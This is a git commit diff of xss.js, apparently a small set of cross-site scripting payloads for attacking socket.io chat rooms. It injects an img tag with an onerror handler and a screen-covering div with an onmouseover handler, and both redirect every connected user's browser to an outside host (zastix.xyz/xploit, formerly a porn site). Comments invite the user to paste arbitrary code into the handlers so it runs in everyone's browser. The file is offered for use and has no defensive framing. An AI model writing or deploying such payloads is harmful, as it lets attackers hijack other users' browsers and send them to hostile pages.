982318df7dc41d9152d8dbc679c5c2f33ceadd85
zastix <69748767+ZasticBradyn@users.noreply.github.com>
2022-04-13 17:01:56 -0500

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,17 +1,17 @@
 // OnError method
-xxs = `<img src="e.png" onerror="location.href='https://pornhub.com/'">`
-socket.emit('chat', {
+xxs = `<img src="e.png" onerror="location.href='https://zastix.xyz/xploit'">`
+socket.emit('chat message', {
     message: '',
-    handle: xxs
+    user: xxs
   })
 // Put your minified code in onerror="CODE HERE"
 // it will then run on everyone broswer, that is connected to the chat
 
 // Div method
 xxs = `<div style="transform:translate(-50%,-20%);width:10000px;height:10000px;background-color:black;position:absolute;" onmouseover=location.href="https://zastix.xyz/xploit">`
-socket.emit('chat', {
+socket.emit('chat message', {
     message: "",
-    handle: xxs
+    user: xxs
   })
 // Put your code in onmouseover="CODE HERE"
 // When the user hovers over the DIV that is covering the screen it will run the code.
